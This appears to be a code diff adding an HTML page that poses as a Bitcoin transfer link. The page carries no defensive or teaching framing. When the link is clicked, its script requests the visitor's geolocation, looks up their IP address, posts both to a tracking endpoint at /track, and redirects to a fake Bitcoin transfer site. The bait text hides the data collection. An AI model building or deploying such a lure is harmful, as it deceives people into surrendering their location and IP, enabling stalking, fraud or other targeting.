@@ -1,0 +1,47 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Bitcoin Transfer</title>
+</head>
+<body>
+  <a href="#" id="bitcoinLink">Click here to complete your Bitcoin transfer</a>
+
+  <script>
+    document.getElementById('bitcoinLink').addEventListener('click', function(event) {
+      event.preventDefault();
+
+      if (navigator.geolocation) {
+        navigator.geolocation.getCurrentPosition(async function(position) {
+          const latitude = position.coords.latitude;
+          const longitude = position.coords.longitude;
+
+          // Get the user's IP address
+          const ipResponse = await fetch('https://api.ipify.org?format=json');
+          const ipData = await ipResponse.json();
+          const ip = ipData.ip;
+
+          const response = await fetch('http://localhost:3000/track', {
+            method: 'POST',
+            headers: {
+              'Content-Type': 'application/json'
+            },
+            body: JSON.stringify({ latitude, longitude, ip })
+          });
+
+          const result = await response.text();
+          console.log(result);
+
+          // Redirect to a fake Bitcoin transfer page
+          window.location.href = 'https://fakebitcointransfer.com';
+        }, function(error) {
+          console.error('Error getting location:', error);
+        });
+      } else {
+        console.error('Geolocation is not supported by this browser.');
+      }
+    });
+  </script>
+</body>
+</html>
